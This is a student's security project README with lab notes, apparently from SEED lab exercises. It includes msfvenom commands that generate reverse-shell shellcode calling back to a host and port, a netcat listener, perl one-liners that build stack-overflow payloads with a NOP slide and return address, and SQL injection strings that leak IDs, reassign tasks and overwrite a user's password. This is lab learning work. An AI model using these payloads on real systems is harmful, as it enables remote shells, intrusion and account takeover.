# Project: Exploring Buffer Overflow, XSS and SQL Injection Techniques

<!-- markdown-toc start - Don't edit this section. Run M-x markdown-toc-refresh-toc -->
**Table of Contents**

- [Project: Exploring Buffer Overflow, XSS and SQL Injection Techniques](#project-exploring-buffer-overflow-xss-and-sql-injection-techniques)
    - [Owner](#owner)
    - [Methodology](#methodology)
    - [Results and Discussion](#results-and-discussion)
- [Buffer Overflow](#buffer-overflow)
    - [Generate Shell Code](#generate-shell-code)
    - [Findings](#findings)
        - [2023-01-30](#2023-01-30)
    - [SQL Injection](#sql-injection)
        - [Steps](#steps)
        - [TODO](#todo)
        - [Sources](#sources)

<!-- markdown-toc end -->


This project aims to explore the vulnerabilities of software systems through the use of buffer overflow and SQL injection attacks. These types of attacks are commonly used by malicious actors to gain unauthorized access to sensitive information, disrupt system functionality, or execute arbitrary code on a target system.

Additionally, the project will utilise industry standard tools such as Metasploit Framework to conduct the experiments, demonstrating the ability to work with real-world tools and technologies used in penetration testing and vulnerability assessments. Furthermore, the project will also include a section on mitigation techniques and best practices for secure software development, showing the ability to not only identify vulnerabilities but also propose solutions to fix them. This will showcase a well-rounded understanding of the field, which is highly desirable for employers in the security industry.

## Owner
* Luyang Liu

## Methodology
The project will begin by conducting research on the basics of buffer overflow and SQL injection attacks, including the underlying mechanisms, common techniques, and tools used to perform these types of attacks. This research will be used to inform the design of experiments to demonstrate the vulnerabilities of a sample software system to buffer overflow and SQL injection attacks.

The sample software system chosen for this project will be a simple web application, which will be set up in a controlled environment. The web application will be configured with known vulnerabilities, such as weak input validation and poor error handling, to make it susceptible to buffer overflow and SQL injection attacks.

Once the sample software system is set up, a series of experiments will be conducted to demonstrate the vulnerabilities of the system to buffer overflow and SQL injection attacks. These experiments will involve using a variety of tools and techniques to inject malicious input into the system and observe the resulting behaviour.

## Results and Discussion
The results of the experiments will be analyzed to determine the effectiveness of the buffer overflow and SQL injection attacks, and to identify any potential countermeasures that can be implemented to protect the sample software system from these types of attacks.

The findings of this project will be discussed in a report, which will include an overview of the research conducted, a description of the methodology used, and a detailed analysis of the results. The report will also include recommendations for improving the security of the sample software system, as well as suggestions for future research in this area.

# Buffer Overflow

## Generate Shell Code

* This sheems to work
```shell
msfvenom -p linux/x86/shell/reverse_tcp -f c
```

```sh
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c
```

* This enable shikata_ga_nai encoding
```shell
sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f c
```


* Basic encoding
```sh
sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c -b "\x00\x0a\x0d\x20"
```

* List encoders

```sh
./msfvenom -l encoders
```

## Findings
* Stacks grow from higher address to lower
* So the buffer would be above the frame pointer and return address.
* The goal is to replace the return address to the NOP slide.
* Afterwards run the payload (reverse shell code)

* From question one the payload is too short to reach the return address so the code runs normally

### 2023-01-30
* Original metasploit shell code linux/x86/shell_reverse_tcp is missing an exit code

### 2023-01-31
* By using BOF pattern generator discovered return address offset is **44**.

* Generate exploit
    * return address is **0x080485c4**
    * return address is \xc4\x85\x04\x08
    * return to shell code is **0xbffff1d0**
    * return to shell  code is \xd0\xf1\xff\xbf
    * Beginning of buffer is 0xbffff190
    * Beginning of buffer is \x90\xf1\xff\xff\xbf

```shell
xcd\x80
```

* Netcat from other (attacker) terminal needs to be turned on for shellcode to work.
```shell
nc -lvp 80
```

* Before return address
```shell
perl -e 'print "\x90"x4,"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89","\xe1\xcd\x80\x90", "\x90\xf1\xff\xff\xbf"*10' > badfile && cat badfile
```

* After return address
```shell
perl -e 'print "\x90"x44,"\xd0\xf1\xff\xbf"x5,"\x90"x4,"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68","\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89","\xe1\xcd\x80\x90"' > badfile && cat badfile
```

* Shell code only
```shell
perl -e 'print "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68","\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89","\xe1\xcd\x80\x90"' > badfile && cat badfile
```

* Reverse Shell Payload (Not working)
```shell
perl -e 'print "\x90"x44,"\xd0\xf1\xff\xbf"x1,"\x90"x4,"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd","\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02","\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3","\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f","\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\xcd\x80"'
```

* Working Reverse Shell Code
```shell
perl -e 'print "\x90"x44,"\xc0\xf1\xff\xbf"x1,"\x90"x4,"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\xcd\x80"'
```

perl -e 'print "\x90"x44,"\xd0\xf1\xff\xbf"x1,"\x90"x4,"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'

## SQL Injection

### Steps
1. Find out the owner ID of current user.
    * URL: http://www.seedlabsqlinjection.com/unsafe_task_load.php
    * Triggering query
    ```sql
    INSERT INTO tasks (Name, Hours, Amount, Description, Owner, Type) 
    VALUES ('exploit', 12, 1200, (SELECT ID from credential where Name = 'Ted'), 
    (SELECT ID from credential where Name = 'Ted'), 'Exploit Task');
    ```
    * Input into <kbd>Description</kbd> Input Text
    ```sql
    exploit', 12, 1200, ( SELECT ID from credential where Name='Ted'), ( SELECT ID from credential where Name='Ted' ), 'Exploit Task'); -- ;    
    ```

2. Generate new random user and see its username under type column in new row.
    * URL: http://www.seedlabsqlinjection.com/unsafe_task_load.php
    * Triggering query
    ```sql
    INSERT INTO tasks (Name, Hours, Amount, Description, Owner, Type) 
    VALUES 
    ('exploit', 0, 0, ( SELECT generateRandomUser() ), 5, ( SELECT getNewestUserId() ) ); -- ;
    ```
    * Input into <kbd>Description</kbd> Input Text
    ```sql
    exploit', 0, 0, ( SELECT generateRandomUser() ), 5, ( SELECT getNewestUserId() ) ); -- ;
    ```
3. Find out about the new random user’s name under description column in new task row.
    * URL: http://www.seedlabsqlinjection.com/unsafe_task_load.php
    * Triggering Query
    ```sql
    INSERT INTO tasks (Name, Hours, Amount, Description, Owner, Type) 
    VALUES 
    (‘exploit', 0, 0, ( SELECT Name from credential WHERE Id=(SELECT getNewestUserId() ) ), 5, ( SELECT Name from credential WHERE Id=(SELECT getNewestUserId() ) ) ); -- ;
    ```
    * Input into <kbd>Asc or Dsc</kbd> Input Text
    ```sql
    exploit', 0, 0, ( SELECT Name from credential WHERE Id=(SELECT getNewestUserId() ) ), 5, ( SELECT Name from credential WHERE Id=(SELECT getNewestUserId() ) ) ); -- ;
    ```

4. Move all tasks to new user.
    * URL: http://www.seedlabsqlinjection.com/unsafe_view_order.php
    * Triggering Query
    ```sql
    SELECT tasks.Name as taskname, credential.Name as ownername, tasks.Hours,tasks.Amount,tasks.Description,tasks.Type 
    from 
    tasks, credential 
    where 
    tasks.owner=credential.ID and tasks.owner=$id 
    order by tasks; copyTasksToUser((SELECT getNewestUserId())); -- ;
    ```
    * Input into <kbd>Asc or Dsc</kbd> Input Text
    ```sql
    ; CALL copyTasksToUser((SELECT getNewestUserId())); -- ;
    ```

5. Change new user password to 123 using sha1(123)=’40bd001563085fc35165329ea1ff5c5ecbdbbeef’
    * URL: http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php
    * Triggering Query

    ```sql
    UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_addr ess',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id; -- ;
    ```
    * Input into <kbd>Asc or Dsc</kbd> Input Text
    ```sql
    ', Password='40bd001563085fc35165329ea1ff5c5ecbdbbeef' WHERE Name='SY07S898'; -- ;
    ```



### TODO
* Make the overflow payload str end with repeated return address.
* Reverse Shellcode in the middle for execution
* NOP slide at the start so it can trap the execution.

### Sources
https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html
https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
